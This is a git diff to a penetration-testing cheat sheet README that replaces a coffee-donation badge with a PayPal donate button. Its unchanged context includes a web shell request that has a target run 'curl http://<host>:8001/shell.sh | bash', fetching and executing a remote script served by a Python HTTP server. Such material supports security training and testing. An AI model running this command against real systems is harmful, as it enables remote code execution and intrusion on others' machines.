@@ -4,8 +4,6 @@
   <a href="https://github.com/kraloveckey/venom/penetration-testing"><img src="../images/img/hack-logo.png" width=150 height=140 lt="Cyber Cheat Sheet"></a>
 </h1>
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/kraloveckey)
-
 [`HackTricks`](https://book.hacktricks.xyz/) - the wiki where you will find each hacking trick/technique/whatever I have learnt from CTFs, real life apps, reading researches, and news.
 
 ---
@@ -2755,3 +2753,9 @@ python -m http.server 8001
 ```
 
 Going to: `http://<host1>/exports/top_players_a3pitdu4.php?cmd=curl%20http://<host>:8001/shell.sh%20|%20bash`
+
+---
+
+<a href="https://www.paypal.com/donate/?hosted_button_id=GWWLEXEF3XL92">
+  <img src="https://raw.githubusercontent.com/kraloveckey/kraloveckey/refs/heads/main/.assets/paypal-donate-button.png" alt="Donate with PayPal" width="225" height="100"/>
+</a>
